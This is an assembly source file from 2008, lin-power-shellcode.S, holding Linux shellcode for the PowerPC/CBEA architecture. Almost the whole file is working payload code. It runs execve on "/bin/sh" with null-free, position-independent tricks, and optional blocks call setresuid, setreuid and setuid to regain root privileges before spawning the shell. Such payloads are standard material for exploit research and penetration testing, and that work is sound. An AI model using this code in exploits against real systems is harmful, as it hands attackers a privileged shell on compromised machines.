/*
 *  $Id: lin-power-shellcode.S 40 2008-11-17 02:45:30Z ramon $
 *
 *  lin-power-shellcode.S - Linux Power/CBEA shellcode
 *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

/*
 * Compile with the following command.
 * $ gcc [-DALL] -Wall -o lin-power-shellcode lin-power-shellcode.S
 *
 */

#include "linux-power.h"

    .globl main

main:

#ifdef ALL
setresuidcode:
    lil     %r31,__CAL
    xor     %r5,%r5,%r5
    xor     %r4,%r4,%r4
    xor     %r3,%r3,%r3
    cal     %r0,__NC_setresuid(%r31)
    .long   0x44ffff02

setreuidcode:
    lil     %r31,__CAL
    xor     %r4,%r4,%r4
    xor     %r3,%r3,%r3
    cal     %r0,__NC_setreuid(%r31)
    .long   0x44ffff02

setuidcode:
    lil     %r31,__CAL
    xor     %r3,%r3,%r3
    cal     %r0,__NC_setuid(%r31)
    .long   0x44ffff02

#endif

shellcode:
    lil     %r31,__CAL
    xor.    %r5,%r5,%r5
    bnel    shellcode
    mflr    %r30
    cal     %r30,511(%r30)
    cal     %r3,-511+36(%r30)
    stb     %r5,-511+43(%r30)
    stu     %r5,-4(%r1)
    stu     %r3,-4(%r1)
    mr      %r4,%r1
    cal     %r0,__NC_execve(%r31)
    .long   0x44ffff02
    .asciz  "/bin/sh"

#ifdef ALL
exitcode:
    lil     %r31,__CAL
    xor     %r3,%r3,%r3
    cal     %r0,__NC_exit(%r31)
    .long   0x44ffff02

#endif

